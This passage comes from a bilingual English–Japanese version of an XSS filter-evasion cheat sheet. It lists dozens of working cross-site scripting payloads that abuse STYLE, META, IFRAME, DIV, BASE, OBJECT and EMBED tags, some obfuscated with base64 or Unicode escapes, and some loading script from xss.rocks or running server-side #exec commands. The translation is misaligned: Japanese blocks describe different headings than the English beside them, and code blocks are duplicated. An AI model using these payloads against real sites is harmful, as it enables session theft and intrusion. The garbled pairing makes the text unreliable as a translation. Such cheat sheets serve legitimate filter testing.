- `onError()` / `onFilterChange()` (文書・画像読み込みエラーや視覚フィルタ変更完了時)
- `onHashChange()` / `onMessage()` / `onPopState()` / `onStorage()` (フラグメント、メッセージ、履歴、ストレージの変化時)
- `onHelp()` (フォーカス中に F1 が押されたとき)
- `onKeyDown()` / `onKeyPress()` / `onKeyUp()` (キー操作時)
- `onLayoutComplete()` (印刷または印刷プレビュー時)
- `onLoad()` (ウィンドウ読み込み後)
- `onLoseCapture()` ( `releaseCapture()` メソッドで悪用可能)
- `onMediaComplete()` / `onMediaError()` / `onTrackChange()` (ストリーミングメディアやプレイリスト状態の変化時)
- `onMove()` / `onMoveStart()` / `onMoveEnd()` / `onResize()` / `onResizeStart()` / `onResizeEnd()` (ページ移動やウィンドウリサイズ時。`self.resizeTo(500,400)` などで誘発可能)
- `onOffline()` / `onOnline()` (ブラウザのオンライン・オフライン状態が変わるとき)
- `onOutOfSync()` / `onSyncRestored()` (タイムラインで定義されたメディア再生能力が中断・復元されるとき)
- `onRedo()` / `onUndo()` (undo 履歴を前後に移動したとき)
- `onReset()` / `onSubmit()` (フォームのリセットまたは送信時)
- `onRowsEnter()` / `onRowExit()` / `onRowDelete()` / `onRowInserted()` (データソースの行変更時)
- `onScroll()` (スクロール時。`scrollBy()` で誘発可能)
- `onStop()` (停止ボタンまたはページ離脱時)
- `onURLFlip()` (HTML+TIME メディアタグで再生される ASF ファイルが埋め込みスクリプトコマンドを処理したとき)
- `seekSegmentTime()` (セグメントタイムライン上の指定点を探し、その位置から再生を開始するメソッド)

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Remote style sheet

Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### BGSOUND

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
```text

```javascript
<BGSOUND SRC="javascript:alert('XSS');">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Remote style sheet part 2

This works the same as above, but uses a `&lt;STYLE>` tag instead of a `&lt;LINK>` tag). A slight variation on this vector was used
to hack Google Desktop. As a side note, you can remove the end `&lt;/STYLE&gt;` tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### & JavaScript includes

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
```text

```html
<BR SIZE="&{alert('XSS')}">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Remote style sheet part 3

This only works in Gecko rendering engines and works by binding an XUL file to the parent page.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### STYLE sheet

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```text

```html
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### STYLE Tags that Breaks Up JavaScript for XSS

This XSS at times sends IE into an infinite loop of alerts:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### リモートスタイルシート

リモートスタイルシートのような単純なものを使うだけで、style パラメータを埋め込み expression で再定義できるため XSS を含められる。これは IE でのみ動作する。ページ上には JavaScript が含まれていることを示すものがない点に注意する。注記として、これらのリモートスタイルシート例はすべて body タグを使うため、ベクタ自体以外のコンテンツがページにないと動作しない。空白ページで動かすには、ページに 1 文字を追加する必要がある。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```text

```html
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### STYLE Attribute that Breaks Up an Expression

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### リモートスタイルシート part 2

上と同じように動作するが、`&lt;LINK>` タグではなく `&lt;STYLE>` タグを使う。このベクタのわずかな変種は Google Desktop の侵害に使われた。補足として、ベクタの直後にそれを閉じる HTML がある場合、末尾の `&lt;/STYLE&gt;` タグを削除できる。これは、クロスサイトスクリプティング攻撃内に等号もスラッシュも置けない場合に有用であり、少なくとも一度は実環境で発生している。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```text

```html
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(Created by Roman Ivanov)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### リモートスタイルシート part 3

これは Gecko レンダリングエンジンでのみ動作し、XUL ファイルを親ページにバインドすることで機能する。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### IMG STYLE with Expressions

This is really a hybrid of the last two XSS vectors, but it really does show how hard STYLE tags can be to parse apart. This can send IE into a loop:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### XSS のために JavaScript を分断する STYLE タグ

この XSS は、IE を alert の無限ループに陥らせることがある。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```text

```html
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### STYLE Tag using Background-image

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Expression を分断する STYLE 属性

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```text

```html
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### STYLE Tag using Background

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

(Roman Ivanov による作成。)

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Anonymous HTML with STYLE Attribute

The IE rendering engine doesn't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Expression を使う IMG STYLE

これは実際には直前 2 つの XSS ベクタの混合だが、STYLE タグを解析し分解することがいかに難しいかをよく示している。IE をループさせる可能性がある。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<XSS STYLE="xss:expression(alert('XSS'))">
```text

```html
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Local htc File

This is a little different than the last two XSS vectors because it uses an .htc file that must be on the same server as the XSS vector. This example file works by pulling in the JavaScript and running it as part of the style attribute:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Background-image を使う STYLE タグ

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<XSS STYLE="behavior: url(xss.htc);">
```text

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### US-ASCII Encoding

This attack uses malformed ASCII encoding with 7 bits instead of 8. This XSS method may bypass many content filters but it only works if the host transmits in US-ASCII encoding or if you set the encoding yourself. This is more useful against web application firewall (WAF) XSS evasion than it is server side filter evasion. Apache Tomcat is the only known server that by default still transmits in US-ASCII encoding.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Background を使う STYLE タグ

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
¼script¾alert(¢XSS¢)¼/script¾
```text

```html
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### META

The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### STYLE 属性を持つ匿名 HTML

IE レンダリングエンジンは、作成した HTML タグが実在するかどうかをあまり気にしない。開始山括弧と文字で始まっていればよい。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```text

```html
<XSS STYLE="xss:expression(alert('XSS'))">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### META using Data

Directive URL scheme. This attack method is nice because it also doesn't have anything visible that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see [RFC 2397](https://datatracker.ietf.org/doc/html/rfc2397) for more details.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### ローカル htc ファイル

これは直前 2 つの XSS ベクタとは少し異なり、XSS ベクタと同じサーバ上にある必要がある `.htc` ファイルを使う。この例のファイルは JavaScript を取り込み、style 属性の一部として実行する。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```text

```html
<XSS STYLE="behavior: url(xss.htc);">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### META with Additional URL Parameter

If the target website attempts to see if the URL contains `[http://]%28http://);` at the beginning you can evade this filter rule with the following technique:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### US-ASCII エンコーディング

この攻撃は 8 ビットではなく 7 ビットの不正な ASCII エンコーディングを使う。この XSS 手法は多くのコンテンツフィルタを迂回する可能性があるが、ホストが US-ASCII エンコーディングで送信している場合、または攻撃者がエンコーディングを自分で設定できる場合にのみ動作する。サーバ側フィルタ回避よりも、Web Application Firewall (WAF) の XSS 回避に対してより有用である。デフォルトで US-ASCII エンコーディングを送信し続けている既知のサーバは Apache Tomcat だけである。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert%28'XSS');">
```text

```html
¼ script ¾ alert(¢XSS¢)¼/script ¾
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(Submitted by Moritz Naumann)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### META

meta refresh の奇妙な点は、ヘッダで referrer を送信しないことである。そのため、参照元 URL を消す必要がある特定種の攻撃で使える。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### IFRAME

If iFrames are allowed there are a lot of other XSS problems as well:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### Data を使う META

Directive URL scheme。この攻撃手法は、SCRIPT という語や JavaScript ディレクティブを可視的に含まないため便利である。base64 エンコーディングを利用するためである。詳細は [RFC 2397](https://datatracker.ietf.org/doc/html/rfc2397) を参照すること。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```text

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### IFRAME Event Based

IFrames and most other elements can use event based mayhem like the following:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 追加 URL パラメータを持つ META

対象サイトが URL の先頭に `[http://]%28http://);` が含まれているか確認しようとする場合、次の手法でそのフィルタ規則を回避できる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```text

```html
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert%28'XSS');">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(Submitted by: David Cross)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

(Moritz Naumann による投稿。)

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### FRAME

Frames have the same sorts of XSS problems as iFrames

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### IFRAME

iFrame が許可されている場合、他にも多くの XSS 問題が存在する。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
```text

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### TABLE

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### イベントベースの IFRAME

iFrame とほとんどの他の要素は、次のようなイベントベースの混乱を利用できる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<TABLE BACKGROUND="javascript:alert('XSS')">
```text

```html
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### TD

Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

(David Cross による投稿。)

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### DIV

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### FRAME

Frame には iFrame と同種の XSS 問題がある。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### DIV Background-image

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### TABLE

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```text

```html
<TABLE BACKGROUND="javascript:alert('XSS')">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### DIV Background-image with Unicode XSS Exploit

This has been modified slightly to obfuscate the URL parameter:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### TD

上と同じように、TD は JavaScript XSS ベクタを含む BACKGROUND に対して脆弱である。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
```text

```html
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(Original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### DIV

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### DIV Background-image Plus Extra Characters

RSnake built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### DIV Background-image

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```text

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### DIV Expression

A variant of this attack was effective against a real-world XSS filter by using a newline between the colon and `expression`:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### Unicode XSS Exploit を使う DIV Background-image

これは URL パラメータを難読化するために少し変更されている。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<DIV STYLE="width: expression(alert('XSS'));">
```text

```html
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Downlevel-Hidden Block

Only works on the IE rendering engine - Trident. Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our XSS vector to exist. Or the system might try to add comment tags around something in a vain attempt to render it harmless. As we can see, that probably wouldn't do the job:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

(元の脆弱性は、Hotmail の脆弱性として Renaud Lifchitz により発見された。)

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### BASE Tag

(Works on IE in safe mode) This attack needs the `//` to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that many websites uses dynamically placed images like `images/image.jpg` rather than full paths. If the path includes a leading forward slash like `/images/image.jpg`, you can remove one slash from this vector (as long as there are two to begin the comment this will work):

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 追加文字を含む DIV Background-image

RSnake は、IE で開始括弧の後かつ JavaScript ディレクティブの前に許可される誤った文字を検出するため、簡易 XSS fuzzer を作成した。これらは 10 進であるが、もちろん 16 進やパディングも含められる。(次の任意の文字を使用できる: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279)

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<BASE HREF="javascript:alert('XSS');//">
```text

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### OBJECT Tag

If the system allows objects, you can also inject virus payloads that can infect the users, etc with the APPLET tag. The linked file is actually an HTML file that can contain your XSS:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### DIV Expression

この攻撃の変種は、コロンと `expression` の間に改行を入れることで、実環境の XSS フィルタに対して有効だった。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
```text

```html
<DIV STYLE="width: expression(alert('XSS'));">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### EMBED SVG Which Contains XSS Vector

This attack only works in Firefox:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Downlevel-Hidden Block

古い IE の downlevel-hidden 条件コメントを使い、HTML コメントとして見える領域にスクリプトを隠せる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
```text

```html
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(Thanks to nEUrOO for this one)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### BASE タグ

BASE タグを使うと、相対 URL の解決先を攻撃者が制御する場所へ変えられる。末尾の `//` は、後続の文字列をコメントアウトするために使われる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<BASE HREF="javascript:alert('XSS');//">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### XML Data Island with CDATA Obfuscation

This XSS attack works only in IE:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### OBJECT タグ

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```text

```html
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Locally hosted XML with embedded JavaScript that is generated using an XML data island

This attack is nearly the same as above, but instead it refers to a locally hosted (on the same server) XML file that will hold your XSS vector. You can see the result here:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### XSS ベクタを含む SVG を EMBED する

この攻撃は Firefox でのみ動作する。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
```text

```html
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### HTML+TIME in XML

This attack only works in IE and remember that you need to be between HTML and BODY tags for this to work:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### CDATA 難読化を使う XML Data Island

この XSS 攻撃は IE でのみ動作する。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>
```text

```html
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(This is how Grey Magic hacked Hotmail and Yahoo!)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### XML data island で生成される JavaScript を埋め込んだローカルホスト XML

XML data island を使って、ローカルにホストされた XML 内のスクリプトを HTML に流し込む手法である。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Assuming you can only fit in a few characters and it filters against `.js`

This attack allows you to rename your JavaScript file to an image as an XSS vector:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`xsstest.xml` の内容は次のようになる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
```text

```xml
<XSS><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></XSS>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### SSI (Server Side Includes)

This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### XML 内の HTML+TIME

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
```text

```html
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>">
</BODY></HTML>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### PHP

This attack requires PHP to be installed on the server. Again, if you can run any scripts remotely like this, there are probably much more dire issues:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 数文字しか入らず `.js` がフィルタされる場合

